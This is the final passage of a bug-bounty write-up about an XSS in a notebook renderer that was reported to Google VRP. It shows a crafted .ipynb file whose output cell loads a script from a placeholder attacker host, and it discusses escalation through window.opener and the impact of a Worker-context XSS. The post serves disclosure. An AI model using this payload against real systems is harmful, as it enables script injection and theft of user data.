<p><code class="language-plaintext highlighter-rouge">top.window.opener.document.body.innerHTM</code> we are also modifying the source of that page to load the <code class="language-plaintext highlighter-rouge">script1.js</code> file there which does the actual exploitation part.</p>

<blockquote>

  <p>xss.ipynb</p>
</blockquote>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"cells"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
   </span><span class="nl">"cell_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"execution_count"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
   </span><span class="nl">"outputs"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
     </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"text/html"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"&lt;script src='https://&lt;attacker-host&gt;/script2.js'&gt;&lt;/script&gt;"</span><span class="p">],</span><span class="w">
      </span><span class="nl">"text/plain"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
     </span><span class="p">},</span><span class="w">
     </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
     </span><span class="nl">"output_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display_data"</span><span class="w">
    </span><span class="p">}</span><span class="w">
   </span><span class="p">],</span><span class="w">
   </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">""</span><span class="w">
   </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">],</span><span class="w">
 </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nl">"kernelspec"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="nl">"display_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Python 3"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"language"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python3"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"language_info"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="nl">"codemirror_mode"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ipython"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"file_extension"</span><span class="p">:</span><span class="w"> </span><span class="s2">".py"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mimetype"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text/x-python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"nbconvert_exporter"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"pygments_lexer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ipython3"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3.9.6"</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">},</span><span class="w">
 </span><span class="nl">"nbformat"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w">
 </span><span class="nl">"nbformat_minor"</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div>
<p><br />
One thing which I did extra was to make use of <code class="language-plaintext highlighter-rouge">opener</code> property to iframe the vulnerable endpoint  there instead in the same Jupyter notebook renderer if I remember there was still some framing issues I tried going through the chats but I am missing what exactly was the cause which led to this. Well anyways rest of things should be easy to understand</p>

<p>And lastly here‚Äôs the VIDEO POC in action</p>

<center>
<iframe width="560" height="315" src="https://www.youtube.com/embed/s1-2WW8_AHM?si=tr-7rIpo_4MB2yAn" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</center>
<p><br />
<br /></p>

<p>Regarding the impact of this, the xss is in Worker context <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker">https://developer.mozilla.org/en-US/docs/Web/API/Worker</a> , this context doesn‚Äôt have access to properties such as the DOM so proving the impact can be a bit difficult but it does supports fetch api this means you can make requests to read any response or invoke any requests.</p>

<p>Btw what if tell you that there is indeed a way to escalate a Worker  based xss into a full blown one? It‚Äôs not my finding (I am not that skilled) but I can say one thing for sure the technique is super cooooooool :p , I will tag the person here  <a href="https://joaxcar.com/">Johan Carlsson ( @joaxcar )</a> (hehe hope you won‚Äôt mind ) go ahead and force him to write a blogpost about this.</p>

<p>The end result, Google was very generous with the bounty amount they even added a bonus also to this report :)</p>

<p>One of the many reasons why Google VRP is the best program out there</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729220436.png" alt="Pasted image 20250729220436.png" /></p>

<p>If you read till the last , I really appreciate that writing this blogpost really took a lot of time. As this was a finding from one year back I had forgotten most of the things at that time I played with minifies js so my notes were also not proper. For this blogpost as I wanted to explain everything I looked into this bug again and reproduce the bug from scratch which again took quite a time but as this time I had sourcemap with me things were a bit easy and I was able to understand more about how the pieces were moving.</p>

<p>Again I would like thanks Matan for the original discovery of this and also the duo (Sreeram and Sivanesh) without which this bug wouldn‚Äôt be complete :)</p>

  </div><a class="u-url" href="/2025/07/02/idx.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">GitHub User</li>
          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
